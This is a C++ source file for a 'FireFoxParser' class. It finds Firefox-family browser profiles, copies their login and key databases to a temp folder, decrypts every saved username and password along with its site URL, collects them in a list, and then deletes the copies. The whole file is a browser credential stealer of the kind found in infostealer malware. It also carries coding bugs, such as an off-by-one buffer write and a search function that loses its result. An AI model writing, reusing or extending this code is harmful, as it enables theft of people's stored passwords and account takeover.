#include "FireFoxParser.h"

#include <iostream>
#include "cJson.h"
#include "FileOperations.h"
#include "FirefoxDecryptor.h"
#include "RegEditHelper.h"

FireFoxParser::FireFoxParser()
{

}




List<AccountData> FireFoxParser::collect_data()
{
	auto browsers = this->get_mozilla_browsers();

	for (auto& browser : browsers)
	{

		
		auto dir_profile = this->get_profile_dir(browser);	
		
		String temp_dir;
		this->prepare_imports(dir_profile, temp_dir);



		auto mozilla_path = this->get_mozilla_program_dir(temp_dir);
		
		{
			FirefoxDecryptor decryptor;

			if (!decryptor.init(mozilla_path)) {continue;}
			
			if (!decryptor.set_profile_dir(temp_dir + "\\")) {  continue; }

			auto accounts = this->get_encrypted_data(temp_dir + "\\logins.json");

			for (auto& account : accounts)
			{
				decryptor.decrypt_data(account.Username, account.Username);
				decryptor.decrypt_data(account.Password, account.Password);
			}

			for (auto& account : accounts)
			{
				m_account_data.emplace_back(std::move(account));
			}
		}

		IO::remove_directory(temp_dir.c_str());
		
	}

	return m_account_data;
}

List<String> FireFoxParser::get_mozilla_browsers()
{
	const auto m_path_local_data = IO::get_app_folder(CSIDL_APPDATA);

	List<String> foundBrowsers;
	for (auto& browser : m_gecko_list)
	{
		std::string bdir = m_path_local_data + browser;
		if (IO::is_exist_dir(bdir))
		{
			foundBrowsers.emplace_back(bdir);
		}
	}
	return std::move(foundBrowsers);
}

String FireFoxParser::get_profile_dir(const String& dir_localdata)
{
	try
	{		
		String dir = dir_localdata + "\\Profiles";
		
		if (IO::is_exist_dir(dir))
		{
			List<String> sub_profiles;
			IO::get_subdirs(sub_profiles, dir);
			
			for (const auto& profile_mozilla : sub_profiles)
			{
				auto dir_profile = dir + "\\" + profile_mozilla;
				
				const std::string logins = (dir_profile + "\\logins.json");
				const std::string key4_db = (dir_profile + "\\key4.db");
				const std::string places_sqlite = (dir_profile + "\\places.sqlite");
				
				if (IO::is_file_exists(logins) || IO::is_file_exists(key4_db) || IO::is_file_exists(places_sqlite))
				{
					return dir_profile;
				}
			}			
		}		
	}
	catch (...)
	{
		
	}
	return "";
}

String FireFoxParser::get_mozilla_program_dir(const String& temp_dir)
{
	const String path_to_ini_file = temp_dir + "\\compatibility.ini";
	String raw_ini;
	String path_to_software;
	
	if (!IO::is_file_exists(path_to_ini_file)) return "";
	if (!IO::read_file(path_to_ini_file, raw_ini)) return "";	

	try
	{

		const char* delimiter = "\r\n";
		char* pch = strtok(const_cast<char*>(raw_ini.c_str()), delimiter);

		while (pch != 0) 
		{
			auto sub_path = strstr(pch, "LastPlatformDir=");

			if(sub_path)
			{
				
				int start_index = strlen("LastPlatformDir=");
				int count = strlen(sub_path) - start_index;
				char* _temp_path = (char*) malloc(sizeof(char)*count);


				for (int i = start_index, index = 0; index < count; i++, index++)
				{
					_temp_path[index] = sub_path[i];
				}

				_temp_path[count] = '\0';				

				
				path_to_software = _temp_path;
			}

			pch = strtok(NULL, delimiter);
		}




		
		return path_to_software;
	}
	catch (...)
	{
	}
	
	return "";
}

List<AccountData> FireFoxParser::get_encrypted_data(const String& path_to_json)
{
	String data_logins;
	List<AccountData> accounts_data;
	
	if (!IO::read_file(path_to_json, data_logins)) return {};
	
	auto json_root = cJSON_Parse(data_logins.c_str());

	
	if (const auto logins = find_logins_node(json_root->child, "logins"))
	{


		for (int i = 0; i < cJSON_GetArraySize(logins); i++) {

			auto account_row = cJSON_GetArrayItem(logins, i);
			if (!account_row) continue;

			auto count_row = cJSON_GetArraySize(account_row);

			AccountData account_data;
			for (int row_index = 0; row_index < cJSON_GetArraySize(account_row); row_index++)
			{
				auto row = cJSON_GetArrayItem(account_row, row_index);
				if (!row) continue;

				if (strcmp(row->string, "hostname") == 0)
				{
					account_data.Url = cJSON_GetStringValue(row);
					continue;
				}

				if (strcmp(row->string, "encryptedUsername") == 0)
				{
					account_data.Username = cJSON_GetStringValue(row);
					continue;
				}

				if (strcmp(row->string, "encryptedPassword") == 0)
				{
					account_data.Password = cJSON_GetStringValue(row);
					continue;
				}
			}

			accounts_data.emplace_back(account_data);
		}
	}
	
	free(json_root);

	return accounts_data;
}

bool FireFoxParser::prepare_imports(String profile_dir, String& out_temp_dir)
{
	String profile_name;
	
	auto firstNull = profile_dir.find_last_of("\\");
	if (firstNull != String::npos)
		profile_name = profile_dir.substr(firstNull+1);

	out_temp_dir = IO::get_temp_folder() + profile_name;

	if (!IO::is_exist_dir(out_temp_dir))
		IO::create_directory_recursively(out_temp_dir.c_str());

	for(const auto& file : m_required_files)
	{
		try
		{
			
			auto from = (profile_dir+"\\" + file);
			auto to = (out_temp_dir + "\\" + file);

			if (IO::is_file_exists(from))
				IO::copy_file(from, to);
		}
		catch (...)
		{
			return false;
		}
	}

	
	return true;
}

cJSON* FireFoxParser::find_logins_node(cJSON* input_node, const char* pattern)
{
	if (!input_node) return nullptr;

	if (strcmp(input_node->string, pattern) == 0)
	{
		return input_node;
	}

	find_logins_node(input_node->next, pattern);
}


/*
 *
 *
 *
 *
 * 
 */
